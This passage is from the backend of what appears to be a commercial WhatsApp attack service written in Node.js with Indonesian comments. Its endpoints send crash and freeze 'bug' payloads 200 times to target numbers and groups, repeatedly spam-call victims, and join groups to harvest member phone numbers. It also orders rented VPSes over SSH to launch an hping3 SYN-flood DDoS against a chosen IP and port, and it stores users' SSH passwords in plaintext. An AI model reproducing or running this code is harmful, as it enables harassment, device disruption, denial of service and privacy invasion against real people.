                logError(`[❌ TESFUNC] Iteration ${i + 1} crashed:`, iterError.message);
                errors.push(`Iteration ${i + 1}: ${iterError.message}`);
            }
        }
        
    } catch (error) {
        logError(`[❌ TESFUNC] Setup failed:`, error.message);
        throw error;
    }
    
    return {
        successCount,
        errors
    };
}

// Fungsi helper untuk execute function WhatsApp (simplified)
async function executeWhatsAppFunction(funcCode, sock, targetJid, additionalParams = {}) {
    try {
        // Create minimal sandbox dengan semua WhatsApp dependencies
        const sandbox = {
            // WhatsApp core functions
            generateWAMessageFromContent,
            generateWAMessage,
            generateMessageID,
            proto,
            WAMessageProto,
            
            // Socket object dengan semua methods
            sock: {
                relayMessage: (...args) => sock.relayMessage(...args),
                sendMessage: (...args) => sock.sendMessage(...args),
                ...sock
            },
            
            // Parameters
            targetJid,
            ...additionalParams,
            
            // System
            console: {
                log: (...args) => logDebug(`[FUNC LOG]`, ...args),
                error: (...args) => logError(`[FUNC ERROR]`, ...args)
            },
            setTimeout,
            clearTimeout,
            Promise,
            Date,
            Math,
            JSON,
            Object,
            Array,
            String,
            Number,
            Boolean,
            Error,
            Buffer
        };
        
        // Coba ekstrak function name
        let functionName = null;
        const functionMatch = funcCode.match(/(?:async\s+)?function\s+(\w+)/);
        if (functionMatch && functionMatch[1]) {
            functionName = functionMatch[1];
        }
        
        // Buat code untuk dieksekusi
        const executeCode = `
            try {
                ${funcCode}
                
                // Cari function
                let func = null;
                ${functionName ? `func = ${functionName};` : `
                    // Cari semua function
                    const funcs = Object.keys(this).filter(key => typeof this[key] === 'function' && key !== 'console');
                    if (funcs.length > 0) {
                        func = this[funcs[0]];
                    }
                `}
                
                if (!func) {
                    throw new Error('No valid function found');
                }
                
                // Execute dengan parameter
                const paramCount = func.toString().match(/\\(([^)]*)\\)/)[1].split(',').length;
                
                if (paramCount >= 2) {
                    return await func(this.sock, this.targetJid);
                } else if (paramCount === 1) {
                    return await func(this.sock);
                } else {
                    return await func();
                }
                
            } catch (e) {
                throw e;
            }
        `;
        
        const vmContext = vm.createContext(sandbox);
        const script = new vm.Script(executeCode);
        
        return await script.runInContext(vmContext, { timeout: 10000 });
        
    } catch (error) {
        throw error;
    }
}

// ================== VALIDATE FUNCTION API ==================
app.post("/validateFunc", async (req, res) => {
    const { function: funcCode } = req.body;
    
    if (!funcCode) {
        return res.status(400).json({ valid: false, message: "No function code provided" });
    }
    
    try {
        // Pattern untuk mendeteksi function
        const functionPatterns = [
            /(?:async\s+)?function\s+\w+\s*\([^)]*\)/, // async function name() {}
            /const\s+\w+\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/, // const name = () => {}
            /let\s+\w+\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/, // let name = () => {}
            /var\s+\w+\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/ // var name = () => {}
        ];
        
        const hasFunction = functionPatterns.some(pattern => pattern.test(funcCode));
        
        if (!hasFunction) {
            return res.json({ 
                valid: false, 
                message: "Code doesn't contain a valid function declaration" 
            });
        }
        
        // Extract function name
        let functionName = null;
        const nameMatch = funcCode.match(/(?:async\s+)?function\s+(\w+)/);
        if (nameMatch && nameMatch[1]) {
            functionName = nameMatch[1];
        } else {
            // Coba cari dari arrow function
            const arrowMatch = funcCode.match(/(?:const|let|var)\s+(\w+)\s*=/);
            if (arrowMatch && arrowMatch[1]) {
                functionName = arrowMatch[1];
            }
        }
        
        // Simple syntax check
        const sandbox = vm.createContext({});
        const script = new vm.Script(`(() => { ${funcCode} })()`);
        script.runInContext(sandbox);
        
        return res.json({
            valid: true,
            message: "Function syntax is valid",
            functionName: functionName,
            hasAsync: funcCode.includes("async"),
            lineCount: funcCode.split('\n').length,
            hasWhatsApp: funcCode.includes('generateWAMessageFromContent') || 
                        funcCode.includes('proto') ||
                        funcCode.includes('WAMessageProto')
        });
        
    } catch (error) {
        return res.json({
            valid: false,
            message: `Syntax error: ${error.message}`
        });
    }
});

// ================== PUBLIC CHAT ENDPOINTS ==================
// Endpoint untuk mendapatkan public chat
app.post("/get-public-chat", (req, res) => {
  const { username, sessionKey } = req.body;
  
  // Validasi session
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo || keyInfo.username !== username) {
    return res.json({ 
      success: false, 
      message: "Session tidak valid" 
    });
  }
  
  // Update online status user
  onlineUsers.set(username, Date.now());
  
  // Load chat
  const chatData = loadChat();
  
  // Ambil 100 pesan terakhir
  const messages = chatData.slice(-100);
  
  res.json({
    success: true,
    messages: messages,
    online_users: Array.from(onlineUsers.keys())
  });
});

// Endpoint untuk mengirim public chat
app.post("/send-public-chat", (req, res) => {
  const { username, message, sessionKey } = req.body;
  
  // Validasi session
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo || keyInfo.username !== username) {
    return res.json({ 
      success: false, 
      message: "Session tidak valid" 
    });
  }
  
  // Validasi pesan
  if (!message || message.trim().length === 0) {
    return res.json({ 
      success: false, 
      message: "Pesan tidak boleh kosong" 
    });
  }
  
  if (message.length > 500) {
    return res.json({ 
      success: false, 
      message: "Pesan maksimal 500 karakter" 
    });
  }
  
  // Buat pesan baru
  const newMessage = {
    username: username,
    message: message.trim(),
    time: new Date().toISOString()
  };
  
  // Load chat, tambah pesan, simpan
  const chatData = loadChat();
  chatData.push(newMessage);
  
  // Batasi jumlah pesan (simpan maksimal 1000 pesan)
  if (chatData.length > 1000) {
    chatData.splice(0, chatData.length - 1000);
  }
  
  saveChat(chatData);
  
  // Update online status
  onlineUsers.set(username, Date.now());
  
  res.json({
    success: true,
    message: "Pesan berhasil dikirim"
  });
});

// Endpoint untuk mendapatkan online users saja
app.get("/get-online-users", (req, res) => {
  const { sessionKey } = req.query;
  
  const keyInfo = activeKeys[sessionKey];
  if (!keyInfo) {
    return res.json({ success: false });
  }
  
  res.json({
    success: true,
    online_users: Array.from(onlineUsers.keys())
  });
});

app.get('/addCoins', (req, res) => {
  const { key, username, amount, type } = req.query;
  
  const senderUsername = getUserByKey(key); 
  if (!senderUsername) {
    return res.json({ success: false, message: "Invalid session key." });
  }

  const db = loadDatabaseCached();
  const sender = db.find(u => u.username === senderUsername);

  if (!sender || (sender.role !== 'owner')) { 
    return res.json({ success: false, message: "Akses ditolak. Hanya Owner yang bisa kirim koin." });
  }

  if (!username || !amount || !type) {
    return res.json({ success: false, message: "Data tidak lengkap (username/amount/type)." });
  }

  const targetUser = db.find(u => u.username.toLowerCase() === username.toLowerCase());

  if (!targetUser) {
    return res.json({ success: false, message: `User '${username}' tidak ditemukan.` });
  }

  const addAmount = parseInt(amount);
  if (isNaN(addAmount) || addAmount <= 0) {
    return res.json({ success: false, message: "Jumlah harus berupa angka positif." });
  }
  
  let currencyType = type.toLowerCase();
  let newBalance = 0;

  if (currencyType === 'bitcoin' || currencyType === 'coin') {
    targetUser.bitcoin = (targetUser.bitcoin || 0) + addAmount;
    newBalance = targetUser.bitcoin;
  } else if (currencyType === 'stars' || currencyType === 'star') {
    targetUser.stars = (targetUser.stars || 0) + addAmount;
    newBalance = targetUser.stars;
  } else {
    return res.json({ success: false, message: "Tipe mata uang salah (gunakan bitcoin/stars)." });
  }

  saveDatabaseCached(db); 

  logDebug(`[💰 ADD COIN] ${senderUsername} mengirim ${addAmount} ${currencyType} ke ${targetUser.username}. Saldo baru: ${newBalance}`);

  return res.json({ 
    success: true, 
    message: `Sukses kirim ${addAmount} ${currencyType} ke ${targetUser.username}`,
    newBalance: newBalance
  });
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      logDebug(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return logError(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        logDebug(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

// Spam Call dengan rate limiting
app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    
    logDebug(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);
    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");
          logDebug(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          logDebug(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logDebug("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

// Raid Group
app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
});

// Spy Group
app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    logDebug("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

// Key List functions
const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/pptmfb.png",
    title: "OFF LIGHT",
    desc: "CREADIT BY @rikzxMD_real"
  }
];

// Validate endpoint
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  if (existingSession && existingSession.androidId !== androidId) {
    logDebug(`[📱] Device login baru, override session untuk ${username}`);
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,           // Bug untuk nomer
    listGroupBug: groupBugs, // Bug untuk group
    news
  });
});

// My Info endpoint
app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  logDebug("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    logDebug("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    logDebug("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    logDebug("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    logDebug("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  logDebug("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,           // Bug untuk nomer
    listGroupBug: groupBugs, // Bug untuk group
    news: news
  });
});


// Change password
app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabaseCached();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabaseCached(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// Send Group Bug dengan optimasi
const groupBugCooldown = new Map();

app.get("/sendGroupBug", async (req, res) => {
  const { key, bug, link, senderType } = req.query;

  if (!link || !link.includes("chat.whatsapp.com")) {
    return res.json({ 
      valid: true, 
      sended: false, 
      message: "Link group tidak valid" 
    });
  }

  logDebug(`[📤 GROUP] Request send bug '${bug}' to ${link} using key ${key} - SenderType: ${senderType}`);

  const allowedGroupBugs = groupBugs.map(b => b.bug_id);
  if (!allowedGroupBugs.includes(bug)) {
    return res.json({ 
      valid: false, 
      message: "Bug tidak valid untuk group." 
    });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Key invalid" });

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  // CEK SENDER BERDASARKAN TIPE
  let sock = null;
  let senderTypeName = "";
  
  if (senderType === "pribadi") {
    sock = await getSocketForUserByType(user.username, "pribadi");
    senderTypeName = "PRIBADI";
    
    if (!sock) {
      const userFolder = path.join('permenmd', user.username);
      let registeredCount = 0;
      if (fs.existsSync(userFolder)) {
        registeredCount = fs.readdirSync(userFolder).filter(f => f.endsWith('.json')).length;
      }
      
      return res.json({ 
        valid: false, 
        sended: false, 
        message: registeredCount > 0 
          ? `⚠️ SENDER PRIBADI tidak aktif! Anda memiliki ${registeredCount} sender terdaftar namun tidak ada yang aktif.`
          : "⚠️ Anda tidak memiliki SENDER PRIBADI! Silahkan pairing sender terlebih dahulu." 
      });
    }
    
  } else if (senderType === "private") {
    sock = await getSocketForUserByType(user.username, "private");
    senderTypeName = "GLOBAL";
    
    if (!sock) {
      const globalFolder = path.join('permenmd', 'global');
      let registeredCount = 0;
      if (fs.existsSync(globalFolder)) {
        registeredCount = fs.readdirSync(globalFolder).filter(f => f.endsWith('.json')).length;
      }
      
      return res.json({ 
        valid: false, 
        sended: false, 
        message: registeredCount > 0 
          ? `⚠️ SENDER GLOBAL tidak aktif! Terdapat ${registeredCount} sender global terdaftar namun tidak ada yang aktif. Hubungi admin.`
          : "⚠️ Tidak ada SENDER GLOBAL yang terdaftar! Hubungi admin." 
      });
    }
    
  } else {
    return res.json({ 
      valid: false, 
      message: "Tipe sender tidak valid." 
    });
  }

  // Cooldown untuk group bug
  const now = Date.now();
  const roleCooldowns = { member: 300, reseller: 120, owner: 0, vip: 60 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;
  
  if (!user.lastGroupSend) user.lastGroupSend = 0;
  const diffSeconds = Math.floor((now - user.lastGroupSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      message: `⏳ Cooldown: Tunggu ${cooldownSeconds - diffSeconds} detik.`
    });
  }

  user.lastGroupSend = now;
  saveDatabaseCached(db);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    message: `✅ Mengirim bug group menggunakan SENDER ${senderTypeName}...`
  });

  // Proses di background
  process.nextTick(async () => {
    let groupJid = null;
    
    try {
      const code = link.split("https://chat.whatsapp.com/")[1];
      if (!code) {
        logDebug(`[❌ GROUP] Invalid group link code`);
        return;
      }

      logDebug(`[⏳ GROUP] Joining group via code: ${code}`);
      
      try {
        groupJid = await sock.groupAcceptInvite(code);
        logDebug(`[✅ GROUP] Joined: ${groupJid}`);
      } catch (err) {
        logDebug(`[⚠️ GROUP JOIN ERROR] ${err.message}`);
        return; 
      }

      if (groupJid) {
        logDebug(`[🚀 GROUP] Sending group bug '${bug}' 200x to ${groupJid} using SENDER ${senderTypeName}`);
        
        // Kirim bug ke grup
        const successCount = await executeGroupBug(sock, groupJid, bug, 200);
        
        logDebug(`[✅ GROUP BUG] Selesai mengirim ${successCount}/200x bug ke ${groupJid}`);
        
        // TIDAK KELUAR DARI GRUP - HAPUS OTOMATIS KELUAR
        logDebug(`[📌 GROUP] Bot tetap berada di grup: ${groupJid} (tidak keluar otomatis)`);
      }

    } catch (e) {
      logDebug(`[❌ GROUP ERROR] ${e.message}`);
    } finally {
      // Cleanup cooldown setelah proses selesai
      setTimeout(() => {
        if (groupBugCooldown) groupBugCooldown.delete(key);
      }, 30000);
    }
  });
});

async function executeGroupBug(sock, groupJid, bug, count) {
  logDebug(`[GROUP BUG] Executing '${bug}' ${count}x to ${groupJid} dengan delay 5 detik`);
  
  let successCount = 0;
  const maxRetries = 3;
  
  for (let i = 0; i < count; i++) {
    let retryCount = 0;
    let sent = false;
    
    while (retryCount < maxRetries && !sent) {
      try {

        switch (bug) {

          case "group_blank":
            await freezeClick(sock, groupJid);
            await VNFRusuhGc(sock, groupJid);
            await VNFKillGc(sock, groupJid);
            await VNFGcAmpas(sock, groupJid);
            await VNFBlankGc(sock, groupJid);
            break;
            
          case "group_delay":
            await freezeClick(sock, groupJid);
            await VNFRusuhGc(sock, groupJid);
            await VNFKillGc(sock, groupJid);
            await VNFGcAmpas(sock, groupJid);
            await VNFBlankGc(sock, groupJid);
            break;
         
          default:
            logDebug(`[❌ GROUP BUG] Bug '${bug}' tidak dikenali`);
            return successCount;
        }
        
        successCount++;
        sent = true;
        logDebug(`[📤 GROUP BUG] Berhasil ${bug} ke-${i+1}/${count} ke ${groupJid}`);
        
      } catch (err) {
        retryCount++;
        logDebug(`[⚠️ ERROR] Iterasi ${i+1}, Retry ${retryCount}: ${err.message}`);
        
        if (retryCount < maxRetries) {
          await sleep(2000);
        } else {
          logDebug(`[❌ GAGAL] Iterasi ${i+1}`);
        }
      }
    }
    
    if (i < count - 100) {
      await sleep(5000);
      logDebug(`[⏱️ Delay 5 detik...`);
    }
  }
  
  logDebug(`[✅ DONE] ${successCount}/${count} berhasil ke ${groupJid}`);
  
  return successCount;
}

// Fungsi sleep helper
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Fungsi untuk execute bug dalam batch
async function executeBugBatch(sock, targetJid, bug, count, delay = 1000) {
  const maxConcurrent = 10;

  for (let i = 0; i < count; i += maxConcurrent) {
    const batchPromises = [];

    for (let j = 0; j < maxConcurrent && (i + j) < count; j++) {
      batchPromises.push(executeSingleBug(sock, targetJid, bug));
    }

    await Promise.all(batchPromises);

    // Delay antar batch
    if (i + maxConcurrent < count) {
      await sleep(delay);
    }
  }
}

async function executeSingleBug(sock, targetJid, bug) {
  try {
    switch (bug) {
      case "android":
        for (let i = 0; i < 50; i++) {
          await VsxOks(sock, targetJid);
          await RxVzTriple(sock, targetJid);
          await VnfBlankAndroVersi1(sock, targetJid);
          await freezeAtributtion(sock, targetJid);
          await fcclick(sock, targetJid);
          await VsxBlank(sock, targetJid);
          await NotificeZ(sock, targetJid);
        }
        break;

      case "fc_click":
        for (let i = 0; i < 5; i++) {
          await LocationUi(sock, targetJid);
          await VsxFrezeIos(sock, targetJid);
          await xCursedDocu(sock, targetJid);
          await vkint(sock, targetJid);
        }
        break;

      case "crash":
        for (let i = 0; i < 5; i++) {
          await RxVzVsxSpam(sock, targetJid);
        }
        break;

      case "fc_ios":
        for (let i = 0; i < 10; i++) {
          await VsxMeta(sock, targetJid);
          await VsxCrashInvisDeath(sock, targetJid);
          await sleep(1500);
        }
        break;
        
        case "frezexstuk_ios":
        for (let i = 0; i < 5; i++) {
          await NeoDestra(sock, targetJid);
          await VsxCrashInvisDeath(sock, targetJid);
          await VsxUi(sock, targetJid);
        }
        break;
        
        case "delay_spam":
        for (let i = 0; i < 50; i++) {
          await InvisDelayAnis(sock, targetJid);
          await FriendDileyy(sock, targetJid);
          await sleep(1500);
        }
        break;
        
      case "delay_hard":
        for (let i = 0; i < 100; i++) {
          await DelayCik(sock, targetJid);
          await xCursedGsInterEx(sock, targetJid, ptcp = true);
          await dozerDelay(sock, targetJid);
          await DelayHard(sock, targetJid);
          await VsxHard(sock, targetJid);
          await VsxCrashUi(sock, targetJid);
          await BetaDelayLetest(sock, targetJid);
        }
        break;

      default:
        logDebug(`[❌ BUG] Bug type '${bug}' tidak dikenali`);
    }
  } catch (err) {
    logDebug(`[⚠️ BUG ERROR] ${err.message}`);
  }
}

// ================= SEND BUG =================
app.get("/sendBug", async (req, res) => {
  const { key, bug, senderType } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");

  logDebug(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - SenderType: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Session key invalid" });
  }

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // Validasi bug
  const allowedBugs = bugs.map(b => b.bug_id);
  if (!allowedBugs.includes(bug)) {
    return res.json({ 
      valid: false, 
      message: "Bug tidak valid untuk nomer." 
    });
  }

  // CEK SENDER BERDASARKAN TIPE
  let sock = null;
  let senderTypeName = "";
  
  if (senderType === "pribadi") {
    sock = await getSocketForUserByType(user.username, "pribadi");
    senderTypeName = "PRIBADI";
    
    if (!sock) {
      // Hitung jumlah sender pribadi yang terdaftar
      const userFolder = path.join('permenmd', user.username);
      let registeredCount = 0;
      if (fs.existsSync(userFolder)) {
        registeredCount = fs.readdirSync(userFolder).filter(f => f.endsWith('.json')).length;
      }
      
      return res.json({ 
        valid: false, 
        sended: false, 
        message: registeredCount > 0 
          ? `⚠️ SENDER PRIBADI tidak aktif! Anda memiliki ${registeredCount} sender terdaftar namun tidak ada yang aktif. Silahkan cek koneksi WhatsApp.`
          : "⚠️ Anda tidak memiliki SENDER PRIBADI! Silahkan pairing sender terlebih dahulu." 
      });
    }
    
  } else if (senderType === "private") {
    sock = await getSocketForUserByType(user.username, "private");
    senderTypeName = "GLOBAL";
    
    if (!sock) {
      // Hitung jumlah sender global yang terdaftar
      const globalFolder = path.join('permenmd', 'global');
      let registeredCount = 0;
      if (fs.existsSync(globalFolder)) {
        registeredCount = fs.readdirSync(globalFolder).filter(f => f.endsWith('.json')).length;
      }
      
      return res.json({ 
        valid: false, 
        sended: false, 
        message: registeredCount > 0 
          ? `⚠️ SENDER GLOBAL tidak aktif! Terdapat ${registeredCount} sender global terdaftar namun tidak ada yang aktif. Hubungi admin untuk mengecek koneksi.`
          : "⚠️ Tidak ada SENDER GLOBAL yang terdaftar! Hubungi admin untuk menambahkan sender global." 
      });
    }
    
  } else {
    return res.json({ 
      valid: false, 
      message: "Tipe sender tidak valid. Gunakan 'pribadi' atau 'private'." 
    });
  }

  // Cooldown check
  const now = Date.now();
  const userLastBug = bugCooldown.get(key) || 0;

  if (now - userLastBug < 2000) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: 2,
      message: `⏳ Cooldown: Tunggu 2 detik.`
    });
  }

  bugCooldown.set(key, now);

  // Langsung return sukses, proses di background
  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    message: `✅ Mengirim bug menggunakan SENDER ${senderTypeName}...`
  });

  // Proses di background
  process.nextTick(async () => {
    try {
      const targetJid = target + "@s.whatsapp.net";
      
      logDebug(`[🚀 BUG] Starting ${bug} to ${target} using ${senderTypeName} sender`);
      
      // Eksekusi bug
      await executeBugBatch(sock, targetJid, bug, 200, 1000);
      
      logDebug(`[🏁 BUG DONE] '${bug}' ke ${target} selesai 200x menggunakan SENDER ${senderTypeName}`);
    } catch (err) {
      logDebug(`[❌ BUG ERROR] ${err.message}`);
    } finally {
      setTimeout(() => bugCooldown.delete(key), 30000);
    }
  });
});


// Get Info
app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    logDebug("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

// Fungsi untuk mendapatkan session aktif di folder tertentu
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];
  
  const activeCreds = [];
  
  // Baca semua file JSON di folder
  const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.json'));
  
  for (const file of files) {
    const sessionName = path.basename(file, '.json');
    
    // Cek apakah session ini aktif di activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        phone: sessionName,
        connected: true,
        type: subfolderName === 'global' ? 'Global' : 'Personal',
        folder: subfolderName
      });
    } else {
      // Tetap tampilkan meskipun tidak aktif (untuk info)
      activeCreds.push({
        sessionName: sessionName,
        phone: sessionName,
        connected: false,
        type: subfolderName === 'global' ? 'Global' : 'Personal',
        folder: subfolderName
      });
    }
  }
  
  return activeCreds;
}

